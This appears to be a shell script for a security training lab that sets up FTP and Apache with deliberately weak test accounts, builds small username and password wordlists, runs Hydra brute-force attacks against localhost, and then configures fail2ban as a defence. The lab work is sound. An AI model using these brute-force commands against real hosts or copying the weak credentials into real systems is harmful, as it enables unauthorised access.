#!/bin/bash

# Update system

sudo apt update

# Install services

sudo apt install -y vsftpd apache2 fail2ban

# Start services

sudo systemctl start vsftpd
sudo systemctl start apache2
sudo systemctl enable vsftpd
sudo systemctl enable apache2

# Verify services

echo "Checking listening ports..."
sudo netstat -tlnp | grep -E ':(21|80)'

# Create FTP test users

echo "Creating test users..."
sudo useradd -m testuser1
sudo useradd -m admin

echo 'testuser1:password123' | sudo chpasswd
echo 'admin:admin' | sudo chpasswd

# Setup protected web directory

sudo mkdir -p /var/www/html/protected
echo "<h1>Protected Area</h1>" | sudo tee /var/www/html/protected/index.html

# Create HTTP authentication users

sudo htpasswd -cb /etc/apache2/.htpasswd webuser password
sudo htpasswd -b /etc/apache2/.htpasswd admin admin123

# Configure Apache authentication

sudo tee /etc/apache2/sites-available/000-default.conf > /dev/null << 'EOF'
<VirtualHost *:80>
DocumentRoot /var/www/html
<Directory /var/www/html/protected>
AuthType Basic
AuthName "Protected Area"
AuthUserFile /etc/apache2/.htpasswd
Require valid-user </Directory> </VirtualHost>
EOF

# Restart Apache

sudo systemctl restart apache2

# Create wordlists

echo "Creating username list..."
cat > userlist.txt << EOF
admin
root
test
testuser1
webuser
guest
EOF

echo "Creating password list..."
cat > passlist.txt << EOF
password
123456
admin
password123
admin123
test
guest
qwerty
letmein
EOF

# Run Hydra FTP brute force

echo "Running FTP brute force..."
hydra -L userlist.txt -P passlist.txt -v -f -o ftp_results.txt 127.0.0.1 ftp

# Run Hydra HTTP brute force

echo "Running HTTP brute force..."
hydra -L userlist.txt -P passlist.txt -f -o http_results.txt 127.0.0.1 http-get /protected/

# Show results

echo "FTP Results:"
cat ftp_results.txt

echo "HTTP Results:"
cat http_results.txt

# Configure Fail2Ban

echo "Configuring Fail2Ban..."
sudo tee /etc/fail2ban/jail.local > /dev/null << 'EOF'
[DEFAULT]
bantime = 600
findtime = 300
maxretry = 3

[vsftpd]
enabled = true
port = ftp
logpath = /var/log/vsftpd.log
maxretry = 3

[apache-auth]
enabled = true
port = http,https
logpath = /var/log/apache2/error.log
maxretry = 3
EOF

# Start Fail2Ban

sudo systemctl restart fail2ban
sudo systemctl enable fail2ban

# Check Fail2Ban status

sudo fail2ban-client status

echo "=== Lab 12 Setup Complete ==="
